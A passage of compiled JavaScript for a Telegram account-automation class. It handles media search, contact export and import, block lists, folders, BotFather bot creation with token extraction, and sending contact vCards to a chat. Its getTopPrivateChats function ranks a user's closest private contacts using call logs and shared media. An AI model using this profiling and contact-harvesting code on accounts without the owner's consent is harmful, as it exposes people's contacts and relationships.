                    const document = message.media.document;
                    const fileNameAttr = document.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
                    const fileName = fileNameAttr && fileNameAttr instanceof telegram_1.Api.DocumentAttributeFilename ? fileNameAttr.fileName : '';
                    const fileNameText = fileName.toLowerCase();
                    const isWantedFile = !(0, utils_1.contains)(fileNameText, unwantedTexts);
                    return isWantedFile ? message.id : null;
                }
                else {
                    const messageText = (message.text || '').toLowerCase();
                    const containsFilteredContent = (0, utils_1.contains)(messageText, unwantedTexts);
                    return !containsFilteredContent ? message.id : null;
                }
            }));
            const filteredMessages = processedMessages.filter(id => id !== null);
            const localResult = {
                messages: filteredMessages,
                total: count ? count : filteredMessages.length
            };
            finalResult[`${type}`] = localResult;
        }
        return finalResult;
    }
    async getAllMediaMetaData(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;
        let allMedia = [];
        let hasMore = true;
        let lastOffsetId = 0;
        const limit = 200;
        while (hasMore) {
            const response = await this.getMediaMetadata({
                chatId,
                types,
                startDate,
                endDate,
                limit,
                maxId: lastOffsetId,
                minId
            });
            console.log("hasMore: ", response.hasMore, "Total: ", response.total, "lastOffsetId: ", response.lastOffsetId);
            allMedia = allMedia.concat(response.messages);
            if (!response.hasMore) {
                hasMore = false;
                console.log('No more messages to fetch');
            }
            else {
                lastOffsetId = response.lastOffsetId;
                console.log(`Fetched ${allMedia.length} messages so far`);
            }
            await (0, Helpers_1.sleep)(3000);
        }
        return {
            messages: allMedia,
            total: allMedia.length,
        };
    }
    async getFilteredMedia(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const query = {
            limit: limit || 100,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
        };
        const ent = await this.safeGetEntity(chatId);
        console.log(query);
        const messages = await this.client.getMessages(ent, query);
        console.log(`Fetched ${messages.length} messages`);
        const filteredMessages = messages.filter(message => {
            if (!message.media)
                return false;
            const mediaType = this.getMediaType(message.media);
            return types.includes(mediaType);
        });
        console.log(`Filtered down to ${filteredMessages.length} messages`);
        const mediaData = await Promise.all(filteredMessages.map(async (message) => {
            let thumbBuffer = null;
            try {
                if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                    const sizes = message.photo?.sizes || [1];
                    thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                }
                else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                    const sizes = message.document?.thumbs || [1];
                    thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                }
            }
            catch (error) {
                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);
            }
            const mediaDetails = await this.getMediaDetails(message.media);
            return {
                messageId: message.id,
                type: this.getMediaType(message.media),
                thumb: thumbBuffer?.toString('base64') || null,
                caption: message.message || '',
                date: message.date,
                mediaDetails,
            };
        }));
        return {
            messages: mediaData,
            total: messages.total,
            hasMore: messages.length === limit
        };
    }
    async safeGetEntity(entityId) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            return await this.client.getEntity(entityId);
        }
        catch (error) {
            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);
            try {
                const dialogs = await this.client.getDialogs({
                    limit: 300
                });
                for (const dialog of dialogs) {
                    const entity = dialog.entity;
                    if (entity.id.toString() === entityId.toString()) {
                        return entity;
                    }
                }
                console.log(`Entity ${entityId} not found in dialogs either`);
                return null;
            }
            catch (dialogError) {
                console.error('Error while searching dialogs:', dialogError);
                return null;
            }
        }
    }
    generateCSV(contacts) {
        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');
        const rows = contacts.map(contact => [
            contact.firstName,
            contact.lastName,
            contact.phone,
            contact.blocked
        ].join(','));
        return [header, ...rows].join('\n');
    }
    generateVCard(contacts) {
        return contacts.map(contact => {
            const vcard = [
                'BEGIN:VCARD',
                'VERSION:3.0',
                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),
                `TEL;TYPE=CELL:${contact.phone || ''}`,
                'END:VCARD'
            ];
            return vcard.join('\n');
        }).join('\n\n');
    }
    async exportContacts(format, includeBlocked = false) {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        let blockedContacts;
        if (includeBlocked) {
            blockedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetBlocked({
                offset: 0,
                limit: 100
            }));
        }
        if (format === 'csv') {
            const csvData = contacts.map((contact) => ({
                firstName: contact.firstName || '',
                lastName: contact.lastName || '',
                phone: contact.phone || '',
                blocked: blockedContacts ? blockedContacts.peers.some((p) => p.id.toString() === contact.id.toString()) : false
            }));
            return this.generateCSV(csvData);
        }
        else {
            return this.generateVCard(contacts);
        }
    }
    async importContacts(data) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(data.map(async (contact) => {
            try {
                await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                    contacts: [new telegram_1.Api.InputPhoneContact({
                            clientId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000)),
                            phone: contact.phone,
                            firstName: contact.firstName,
                            lastName: contact.lastName || ''
                        })]
                }));
                return { success: true, phone: contact.phone };
            }
            catch (error) {
                return { success: false, phone: contact.phone, error: error.message };
            }
        }));
        return results;
    }
    async manageBlockList(userIds, block) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(userIds.map(async (userId) => {
            try {
                if (block) {
                    await this.client.invoke(new telegram_1.Api.contacts.Block({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                else {
                    await this.client.invoke(new telegram_1.Api.contacts.Unblock({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                return { success: true, userId };
            }
            catch (error) {
                return { success: false, userId, error: error.message };
            }
        }));
        return results;
    }
    async getContactStatistics() {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        const onlineContacts = contacts.filter((c) => c.status && 'wasOnline' in c.status);
        return {
            total: contacts.length,
            online: onlineContacts.length,
            withPhone: contacts.filter((c) => c.phone).length,
            mutual: contacts.filter((c) => c.mutual).length,
            lastWeekActive: onlineContacts.filter((c) => {
                const lastSeen = new Date(c.status.wasOnline * 1000);
                const weekAgo = new Date();
                weekAgo.setDate(weekAgo.getDate() - 7);
                return lastSeen > weekAgo;
            }).length
        };
    }
    async createChatFolder(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const folder = new telegram_1.Api.DialogFilter({
            id: Math.floor(Math.random() * 1000),
            title: new telegram_1.Api.TextWithEntities({
                text: options.name,
                entities: []
            }),
            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),
            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),
            pinnedPeers: [],
            contacts: options.includeContacts ?? true,
            nonContacts: options.includeNonContacts ?? true,
            groups: options.includeGroups ?? true,
            broadcasts: options.includeBroadcasts ?? true,
            bots: options.includeBots ?? true,
            excludeMuted: options.excludeMuted ?? false,
            excludeRead: options.excludeRead ?? false,
            excludeArchived: options.excludeArchived ?? false
        });
        await this.client.invoke(new telegram_1.Api.messages.UpdateDialogFilter({
            id: folder.id,
            filter: folder
        }));
        return {
            id: folder.id,
            name: options.name,
            options: {
                includeContacts: folder.contacts,
                includeNonContacts: folder.nonContacts,
                includeGroups: folder.groups,
                includeBroadcasts: folder.broadcasts,
                includeBots: folder.bots,
                excludeMuted: folder.excludeMuted,
                excludeRead: folder.excludeRead,
                excludeArchived: folder.excludeArchived
            }
        };
    }
    async getChatFolders() {
        if (!this.client)
            throw new Error('Client not initialized');
        const filters = await this.client.invoke(new telegram_1.Api.messages.GetDialogFilters());
        return (filters.filters || []).map((filter) => ({
            id: filter.id ?? 0,
            title: filter.title ?? '',
            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,
            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0
        }));
    }
    async sendMediaBatch(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const mediaFiles = await Promise.all(options.media.map(async (item) => {
            const buffer = await this.downloadFileFromUrl(item.url);
            const file = new uploads_1.CustomFile(item.fileName || `media.${this.getMediaExtension(item.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = item.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(item.type),
                    attributes: this.getMediaAttributes(item)
                });
            return new telegram_1.Api.InputSingleMedia({
                media: inputMedia,
                message: item.caption || '',
                entities: []
            });
        }));
        return this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: options.chatId,
            multiMedia: mediaFiles,
            silent: options.silent,
            scheduleDate: options.scheduleDate
        }));
    }
    getMimeType(type) {
        switch (type) {
            case 'photo': return 'image/jpeg';
            case 'video': return 'video/mp4';
            case 'document': return 'application/octet-stream';
            default: return 'application/octet-stream';
        }
    }
    getMediaAttributes(item) {
        const attributes = [];
        if (item.fileName) {
            attributes.push(new telegram_1.Api.DocumentAttributeFilename({
                fileName: item.fileName
            }));
        }
        if (item.type === 'video') {
            attributes.push(new telegram_1.Api.DocumentAttributeVideo({
                duration: 0,
                w: 1280,
                h: 720,
                supportsStreaming: true
            }));
        }
        return attributes;
    }
    async editMessage(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        if (options.media) {
            const buffer = await this.downloadFileFromUrl(options.media.url);
            const file = new uploads_1.CustomFile(`media.${this.getMediaExtension(options.media.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = options.media.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(options.media.type),
                    attributes: this.getMediaAttributes(options.media)
                });
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                media: inputMedia,
                message: options.text || ''
            }));
        }
        if (options.text) {
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                message: options.text
            }));
        }
        throw new Error('Either text or media must be provided');
    }
    async getChats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const dialogs = await this.client.getDialogs({
            ...options,
            limit: options.limit || 100
        });
        return Promise.all(dialogs.map(async (dialog) => {
            const entity = dialog.entity;
            return {
                id: entity.id.toString(),
                title: 'title' in entity ? entity.title : null,
                username: 'username' in entity ? entity.username : null,
                type: entity instanceof telegram_1.Api.User ? 'user' :
                    entity instanceof telegram_1.Api.Chat ? 'group' :
                        entity instanceof telegram_1.Api.Channel ? 'channel' : 'unknown',
                unreadCount: dialog.unreadCount,
                lastMessage: dialog.message ? {
                    id: dialog.message.id,
                    text: dialog.message.message,
                    date: new Date(dialog.message.date * 1000)
                } : null
            };
        }));
    }
    async updateChatSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const chat = await this.client.getEntity(settings.chatId);
        const updates = [];
        if (settings.title) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: chat,
                title: settings.title
            })));
        }
        if (settings.about) {
            updates.push(this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: chat,
                about: settings.about
            })));
        }
        if (settings.photo) {
            const buffer = await this.downloadFileFromUrl(settings.photo);
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: chat,
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: file
                })
            })));
        }
        if (settings.slowMode !== undefined) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: chat,
                seconds: settings.slowMode
            })));
        }
        if (settings.linkedChat) {
            const linkedChannel = await this.client.getEntity(settings.linkedChat);
            updates.push(this.client.invoke(new telegram_1.Api.channels.SetDiscussionGroup({
                broadcast: chat,
                group: linkedChannel
            })));
        }
        if (settings.username) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: chat,
                username: settings.username
            })));
        }
        await Promise.all(updates);
        return true;
    }
    async getMessageStats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = options.fromDate || new Date();
        const startDate = new Date(now);
        switch (options.period) {
            case 'day':
                startDate.setDate(startDate.getDate() - 1);
                break;
            case 'week':
                startDate.setDate(startDate.getDate() - 7);
                break;
            case 'month':
                startDate.setMonth(startDate.getMonth() - 1);
                break;
        }
        const messages = await this.client.getMessages(options.chatId, {
            limit: 100,
            offsetDate: Math.floor(now.getTime() / 1000),
        });
        const stats = {
            total: messages.length,
            withMedia: 0,
            withLinks: 0,
            withForwards: 0,
            byHour: new Array(24).fill(0),
            byType: {
                text: 0,
                photo: 0,
                video: 0,
                document: 0,
                other: 0
            }
        };
        for (const msg of messages) {
            const hour = new Date(msg.date * 1000).getHours();
            stats.byHour[hour]++;
            if (msg.media) {
                stats.withMedia++;
                const mediaType = this.getMediaType(msg.media);
                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;
            }
            else if (msg.message) {
                if (msg.message.match(/https?:\/\/[^\s]+/)) {
                    stats.withLinks++;
                }
                stats.byType.text++;
            }
            if (msg.fwdFrom) {
                stats.withForwards++;
            }
        }
        return stats;
    }
    async getTopPrivateChats() {
        if (!this.client)
            throw new Error('Client not initialized');
        console.log('Starting getTopPrivateChats analysis...');
        const startTime = Date.now();
        const weights = {
            videoCall: 15,
            incoming: 5,
            outgoing: 1,
            sharedVideo: 6,
            sharedPhoto: 4,
            textMessage: 1,
        };
        console.log('Fetching dialogs...');
        const dialogs = await this.client.getDialogs({
            limit: 200
        });
        console.log(`Found ${dialogs.length} total dialogs`);
        const privateChats = dialogs.filter(dialog => dialog.isUser &&
            dialog.entity instanceof telegram_1.Api.User &&
            !dialog.entity.bot &&
            !dialog.entity.fake &&
            dialog.entity.id.toString() !== "777000" &&
            dialog.entity.id.toString() !== "42777");
        console.log(`Found ${privateChats.length} valid private chats after filtering`);
        const now = Math.floor(Date.now() / 1000);
        const batchSize = 10;
        const chatStats = [];
        const callLogs = await this.getCallLogsInternal();
        console.log(callLogs);
        for (let i = 0; i < privateChats.length; i += batchSize) {
            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);
            const batch = privateChats.slice(i, i + batchSize);
            const batchResults = await Promise.all(batch.map(async (dialog) => {
                const processingStart = Date.now();
                const chatId = dialog.entity.id.toString();
                const user = dialog.entity;
                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);
                try {
                    const messages = await this.client.getMessages(chatId, {
                        limit: 30,
                    });
                    if (messages.length < 20) {
                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);
                        return null;
                    }
                    const messageStats = await this.searchMessages({ chatId, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.CHAT_PHOTO], limit: 100 });
                    console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);
                    const callStats = {
                        total: 0,
                        incoming: 0,
                        outgoing: 0,
                        video: 0
                    };
                    const mediaStats = { photos: messageStats.photo.total, videos: messageStats?.video?.total || 0 + messageStats?.roundVideo?.total || 0 };
                    const userCalls = callLogs[chatId];
                    console.log(userCalls);
                    if (userCalls) {
                        callStats.total = userCalls.totalCalls;
                        callStats.incoming = userCalls.incoming;
                        callStats.outgoing = userCalls.outgoing;
                    }
                    const interactionScore = (callStats.incoming * weights.incoming +
                        callStats.outgoing * weights.outgoing +
                        callStats.video * weights.videoCall +
                        mediaStats.videos * weights.sharedVideo +
                        mediaStats.photos * weights.sharedPhoto +
                        messages.total * weights.textMessage);
                    const activityBreakdown = {
                        videoCalls: (callStats.video * weights.videoCall) / interactionScore * 100,
                        incoming: (callStats.incoming * weights.incoming) / interactionScore * 100,
                        outgoing: (callStats.outgoing * weights.outgoing) / interactionScore * 100,
                        mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,
                        textMessages: (messages.total * weights.textMessage) / interactionScore * 100
                    };
                    const processingTime = Date.now() - processingStart;
                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);
                    return {
                        chatId,
                        username: user.username,
                        firstName: user.firstName,
                        lastName: user.lastName,
                        totalMessages: messages.total,
                        interactionScore: Math.round(interactionScore * 100) / 100,
                        calls: callStats,
                        media: mediaStats,
                        activityBreakdown
                    };
                }
                catch (error) {
                    console.error(`Error processing chat ${chatId}:`, error);
                    return null;
                }
            }));
            chatStats.push(...batchResults.filter(Boolean));
        }
        const topChats = chatStats
            .sort((a, b) => b.interactionScore - a.interactionScore)
            .slice(0, 10);
        const totalTime = Date.now() - startTime;
        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);
        topChats.forEach((chat, index) => {
            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);
        });
        return topChats;
    }
    async createGroupOrChannel(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            console.log('Creating group or channel with options:', options);
            const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel(options));
            return result;
        }
        catch (error) {
            console.error('Error creating group or channel:', error);
            throw new Error(`Failed to create group or channel: ${error.message}`);
        }
    }
    async createBot(options) {
        if (!this.client) {
            console.error('Bot creation failed: Client not initialized');
            throw new Error('Client not initialized');
        }
        const botFatherUsername = 'BotFather';
        console.log(`[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
        try {
            console.log('[BOT CREATION] Attempting to get entity for BotFather...');
            const entity = await this.client.getEntity(botFatherUsername);
            console.log('[BOT CREATION] Successfully connected to BotFather');
            console.log('[BOT CREATION] Sending /newbot command...');
            await this.client.sendMessage(entity, {
                message: '/newbot'
            });
            console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            console.log(`[BOT CREATION] Sending bot name: "${options.name}"`);
            await this.client.sendMessage(entity, {
                message: options.name
            });
            console.log('[BOT CREATION] Waiting for BotFather response after sending name...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            let botUsername = options.username;
            if (!/_bot$/.test(botUsername)) {
                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
                let uniqueSuffix = '';
                for (let i = 0; i < 3; i++) {
                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
                console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
            }
            console.log(`[BOT CREATION] Sending bot username: "${botUsername}"`);
            await this.client.sendMessage(entity, {
                message: botUsername
            });
            console.log('[BOT CREATION] Waiting for BotFather response after sending username...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            console.log('[BOT CREATION] Retrieving response from BotFather...');
            const messages = await this.client.getMessages(entity, {
                limit: 1
            });
            if (!messages || messages.length === 0) {
                console.error('[BOT CREATION] No response received from BotFather');
                throw new Error('No response received from BotFather');
            }
            const lastMessage = messages[0].message;
            console.log(`[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
            if (!lastMessage.toLowerCase().includes('use this token')) {
                console.error(`[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`);
                throw new Error(`Bot creation failed: ${lastMessage}`);
            }
            const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
            if (!tokenMatch) {
                console.error('[BOT CREATION] Could not extract bot token from BotFather response');
                throw new Error('Could not extract bot token from BotFather response');
            }
            const botToken = tokenMatch[0];
            console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
            if (options.description) {
                console.log('[BOT CREATION] Setting bot description...');
                await this.client.sendMessage(entity, { message: '/setdescription' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] Sending description text...');
                await this.client.sendMessage(entity, { message: options.description });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] Description set successfully');
            }
            if (options.aboutText) {
                console.log('[BOT CREATION] Setting about text...');
                await this.client.sendMessage(entity, { message: '/setabouttext' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] Sending about text...');
                await this.client.sendMessage(entity, { message: options.aboutText });
                await new Promise(resolve => setTimeout(resolve, 1000));
                console.log('[BOT CREATION] About text set successfully');
            }
            if (options.profilePhotoUrl) {
                console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
                try {
                    console.log('[BOT CREATION] Downloading profile photo...');
                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
                    console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
                    console.log('[BOT CREATION] Sending /setuserpic command...');
                    await this.client.sendMessage(entity, { message: '/setuserpic' });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
                    await this.client.sendMessage(entity, { message: `@${options.username}` });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    console.log('[BOT CREATION] Uploading profile photo...');
                    await this.client.sendFile(entity, {
                        file: Buffer.from(photoBuffer),
                        caption: '',
                        forceDocument: false
                    });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    console.log('[BOT CREATION] Profile photo set successfully');
                }
                catch (photoError) {
                    console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);
                }
            }
            console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);
            return {
                botToken,
                username: botUsername
            };
        }
        catch (error) {
            console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);
            throw new Error(`Failed to create bot: ${error.message}`);
        }
    }
    createVCardContent(contacts) {
        let vCardContent = '';
        contacts.users.map((user) => {
            user = user;
            vCardContent += 'BEGIN:VCARD\n';
            vCardContent += 'VERSION:3.0\n';
            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\n`;
            vCardContent += `TEL;TYPE=CELL:${user.phone}\n`;
            vCardContent += 'END:VCARD\n';
        });
        return vCardContent;
    }
    async sendContactsFile(chatId, contacts, filename = 'contacts.vcf') {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const vCardContent = this.createVCardContent(contacts);
            const tempPath = `./contacts/${chatId}-${filename}`;
            if (!fs.existsSync('./contacts')) {
                fs.mkdirSync('./contacts', { recursive: true });
            }
            fs.writeFileSync(tempPath, vCardContent, 'utf8');
            try {
                const fileContent = fs.readFileSync(tempPath);
                const file = new uploads_1.CustomFile(filename, fs.statSync(tempPath).size, tempPath, fileContent);
                await this.client.sendFile(chatId, {
                    file,
                    caption: `Contacts file with ${contacts.users.length} contacts`,
                    forceDocument: true
                });
                console.log(`Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
            }
            finally {
                if (fs.existsSync(tempPath)) {
                    fs.unlinkSync(tempPath);
                }
            }
        }
        catch (error) {
            console.error('Error sending contacts file:', error);
            throw error;
        }
    }
}
exports.default = TelegramManager;
//# sourceMappingURL=TelegramManager.js.map